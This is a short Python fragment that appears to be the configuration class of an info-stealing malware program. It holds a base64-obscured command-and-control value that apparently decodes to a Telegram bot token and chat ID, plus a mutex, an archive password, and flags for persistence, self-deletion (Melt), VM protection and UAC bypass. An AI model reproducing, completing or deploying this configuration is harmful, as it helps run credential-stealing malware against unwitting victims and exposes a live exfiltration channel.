...
class Settings:
    C2 = (1, base64.b64decode('NjgxMjAwNzg1NjpBQUh1c3pDa19TaWdXR0dGRUN5cmFaMjNhZndVOUdJYnBWayQxNDQzMjMyMDc5').decode())
    Mutex = base64.b64decode('T0lrN3FneG9vaGEzcXFDUQ==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('SDEyMzQ1Ng==').decode()
